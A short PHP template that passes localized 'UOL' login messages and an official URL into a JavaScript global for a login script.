<?php
declare(strict_types=1);
/** Script com mensagens UOL — incluir antes de login.js */
?>
<script>
window.UOL_MESSAGES = <?= json_encode([
    'invalid_login'    => uol_msg('invalid_login'),
    'invalid_email'    => uol_msg('invalid_email'),
    'invalid_password' => uol_msg('invalid_password'),
    'wrong_password'   => uol_msg('wrong_password'),
    'success'          => uol_msg('success'),
    'authenticating'   => uol_msg('authenticating'),
    'no_username'      => uol_msg('no_username'),
    'network_error'    => uol_msg('network_error'),
    'connerror'        => uol_msg('connerror'),
], JSON_UNESCAPED_UNICODE) ?>;
window.UOL_OFFICIAL = <?= json_encode(uol_official_url($config), JSON_UNESCAPED_UNICODE) ?>;
</script>
